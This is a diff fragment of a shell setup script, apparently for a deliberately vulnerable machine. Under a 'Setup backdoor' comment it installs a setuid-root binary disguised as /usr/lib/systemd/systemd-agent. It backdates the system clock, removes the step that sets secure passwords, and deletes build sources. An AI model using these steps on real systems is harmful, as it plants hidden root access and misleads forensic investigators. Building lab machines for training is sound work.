@@ -67,8 +67,8 @@ systemctl daemon-reload
 systemctl enable database
 systemctl start database
 
-# TODO: Set time to 2017-05-15 15:46:45?
-#date  -s '2017-05-15 15:46:45'
+# TODO: Set time in the past
+date  -s '2017-08-04 07:18:59'
 
 # Setup backdoor
 # Compile
@@ -80,11 +80,8 @@ chmod 4755 /usr/lib/systemd/systemd-agent
 # TODO: set time to current
 #date  -s '2017-11-19 15:46:45'
 
-# TODO: set secure passwords for all users (root, iadmin, database)
-# passwd root
-# passwd iadmin
-# passwd database
-
 # Cleanup
 rm -r ./DB
 rm -r ./scripts
+
+echo "TODO: set current date and time with date -s 'yyyy-mm-dd hh:mm:ss'"
